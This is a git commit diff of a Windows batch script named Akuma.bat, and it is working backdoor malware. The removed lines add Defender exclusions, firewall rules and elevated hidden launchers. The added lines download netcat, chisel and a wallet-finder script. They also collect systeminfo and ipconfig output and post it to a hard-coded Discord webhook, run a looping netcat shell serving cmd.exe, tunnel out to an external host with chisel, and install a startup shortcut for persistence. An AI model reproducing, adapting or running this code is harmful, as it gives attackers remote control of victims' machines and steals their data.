33d3edd6814edcc5b66fe23444b187c884e06b6a
L <112792604+l-urk@users.noreply.github.com>
2023-10-27 02:49:14 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -1,27 +1,31 @@
 @echo off
-powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma"
+rmdir /s /q %homedrive%\Akuma
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
-mkdir %homedrive%\ShiniGami
-attrib +h %homedrive%\ShiniGami
-cd %homedrive%\ShiniGami
-curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
-echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
-echo objShell.Run "%homedrive%\ShiniGami\Akuma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
-echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
-echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
-echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
-echo netsh advfirewall firewall delete rule name="Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
-echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
-echo netsh advfirewall firewall delete rule name="Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
-echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
-echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
-echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
-echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
-set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
-IF EXIST "%vbsFilePath%" (
-    cscript "%vbsFilePath%"
-) ELSE (
-    exit
-)
+mkdir %homedrive%\Akuma\nc
+%homedrive%
+cd %homedrive%\A7uma
+curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
+curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
+curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
+curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
+cd %homedrive%\Akuma
+echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1165910868031197255/h9_Fo0Wm3rs8oeVYh0OjZpEcLikL4AysneV7u3fW553KFjRlBeC-KnzGJmTJoZnGzQwB >> %homedrive%\Akuma\zonbi.bat
+echo :start >> %homedrive%\Akuma\nc.bat
+echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
+echo goto start >> %homedrive%\Akuma\nc.bat
+echo :start >> %homedrive%\Akuma\chisel.bat
+echo %homedrive%\Akuma\chisel.exe client 4kum4n0d3z3r0.xyz:32101 127.0.0.1:32102 >> %homedrive%\Akuma\chisel.bat
+echo goto start >> %homedrive%\Akuma\chisel.bat
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
+start %homedrive%\Akuma\Akuma.vbs
+rmdir /s /q %homedrive%\ShiniGami
+exit
